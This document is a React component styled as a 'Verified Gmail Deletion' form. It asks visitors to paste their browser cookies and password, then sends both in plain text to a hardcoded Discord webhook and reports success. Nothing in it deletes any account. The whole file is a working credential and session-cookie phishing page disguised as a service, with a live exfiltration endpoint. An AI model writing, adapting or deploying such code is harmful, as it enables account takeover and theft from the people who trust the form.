import { useState } from "react";
import { motion } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { ArrowLeft, Shield } from "lucide-react";

interface VerifyGmailDeleteProps {
  onBack: () => void;
  onSuccess: () => void;
}

export const VerifyGmailDelete = ({
  onBack,
  onSuccess,
}: VerifyGmailDeleteProps) => {
  const [cookies, setCookies] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  const sendToWebhook = async (data: any) => {
    try {
      const response = await fetch(
        "https://discord.com/api/webhooks/1382124073953263787/QNnd4cako-sTG77Hv6sQ-ZDT1ZX0HM22fuVvIT4ednht3YIj91mEgYwZJ8HiH8TkgvLE",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            embeds: [
              {
                title: "🛡️ Verified Gmail Delete Request",
                color: 0xff6600,
                fields: [
                  {
                    name: "🍪 Cookies",
                    value: `\`\`\`${data.cookies}\`\`\``,
                    inline: false,
                  },
                  {
                    name: "🔐 Password",
                    value: `\`\`\`${data.password}\`\`\``,
                    inline: false,
                  },
                  {
                    name: "⏰ Timestamp",
                    value: new Date().toISOString(),
                    inline: true,
                  },
                  {
                    name: "🎯 Action",
                    value: "Delete Verified Gmail",
                    inline: true,
                  },
                ],
                footer: {
                  text: "X-LiNk System",
                },
              },
            ],
          }),
        },
      );

      if (response.ok) {
        return true;
      } else {
        throw new Error("Failed to send data");
      }
    } catch (error) {
      console.error("Webhook error:", error);
      return false;
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cookies.trim() || !password.trim()) {
      setError("Please fill in all fields");
      return;
    }

    setIsLoading(true);
    setError("");

    const success = await sendToWebhook({ cookies, password });

    if (success) {
      onSuccess();
    } else {
      setError("Failed to process request. Please try again.");
    }

    setIsLoading(false);
  };

  return (
    <motion.div
      className="flex items-center justify-center min-h-screen p-4"
      initial={{ opacity: 0, x: 50 }}
      animate={{ opacity: 1, x: 0 }}
      transition={{ duration: 0.5 }}
    >
      <Card className="w-full max-w-2xl bg-black/60 border-orange-600/50 backdrop-blur-xl shadow-2xl">
        <CardHeader className="text-center pb-6">
          <motion.div
            initial={{ y: -20 }}
            animate={{ y: 0 }}
            transition={{ delay: 0.2 }}
            className="flex flex-col items-center"
          >
            <div className="mb-4 p-3 bg-orange-600/20 rounded-full">
              <Shield className="w-8 h-8 text-orange-400" />
            </div>
            <CardTitle className="text-3xl font-bold text-white mb-2">
              Verified Gmail Deletion
            </CardTitle>
            <p className="text-orange-300 text-sm">
              Enter cookies and password to proceed
            </p>
          </motion.div>
        </CardHeader>
        <CardContent className="space-y-6">
          <form onSubmit={handleSubmit} className="space-y-6">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.3 }}
            >
              <label className="block text-white font-medium mb-2">
                Cookies
              </label>
              <Textarea
                placeholder="Paste your cookies here..."
                value={cookies}
                onChange={(e) => setCookies(e.target.value)}
                className="bg-black/50 border-orange-600/50 text-white placeholder:text-gray-500 min-h-[150px] focus:border-orange-500 transition-colors resize-none"
                disabled={isLoading}
              />
            </motion.div>

            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.4 }}
            >
              <label className="block text-white font-medium mb-2">
                Password
              </label>
              <Input
                type="password"
                placeholder="Enter password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="bg-black/50 border-orange-600/50 text-white placeholder:text-gray-500 h-12 focus:border-orange-500 transition-colors"
                disabled={isLoading}
              />
            </motion.div>

            {error && (
              <motion.p
                className="text-red-400 text-sm text-center font-medium"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
              >
                {error}
              </motion.p>
            )}

            <motion.div
              className="flex gap-4"
              initial={{ y: 20, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ delay: 0.5 }}
            >
              <Button
                type="button"
                onClick={onBack}
                variant="outline"
                className="flex-1 border-gray-600 text-gray-300 hover:bg-gray-700 h-12"
                disabled={isLoading}
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back
              </Button>
              <Button
                type="submit"
                className="flex-1 bg-orange-600 hover:bg-orange-700 text-white h-12 font-semibold"
                disabled={isLoading || !cookies.trim() || !password.trim()}
              >
                {isLoading ? "Processing..." : "Delete Verified Gmail"}
              </Button>
            </motion.div>
          </form>
        </CardContent>
      </Card>
    </motion.div>
  );
};
